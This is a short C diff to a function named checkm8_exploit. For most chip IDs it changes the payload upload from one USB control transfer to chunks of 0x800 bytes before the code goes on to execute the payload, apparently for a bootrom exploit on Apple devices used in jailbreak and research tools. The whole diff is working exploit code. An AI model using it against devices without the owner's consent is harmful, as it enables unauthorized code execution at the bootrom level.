@@ -245,10 +245,24 @@ int checkm8_exploit(irecv_client_t client) {
     }
     
     printf("\x1b[36mUploading payload\x1b[39m\n");
-    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
-    if(ret != IRECV_E_TIMEOUT) {
-        printf("Failed to upload payload.\n");
-        return -1;
+    if(cpid == 0x8960){
+        ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, config.payload, config.payload_len, 100);
+        if(ret != IRECV_E_TIMEOUT) {
+            printf("Failed to upload payload.\n");
+            return -1;
+        }
+    } else {
+        void *buff = malloc(config.payload_len);
+        memcpy(buff, config.payload, config.payload_len);
+        
+        size_t len = 0;
+        while(len < config.payload_len) {
+            size_t size = ((config.payload_len - len) > 0x800) ? 0x800 : (config.payload_len - len);
+            size_t sent = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)&buff[len], size, 100);
+            len += size;
+        }
+        
+        free(buff);
     }
     
     printf("\x1b[36mExecuting payload\x1b[39m\n");
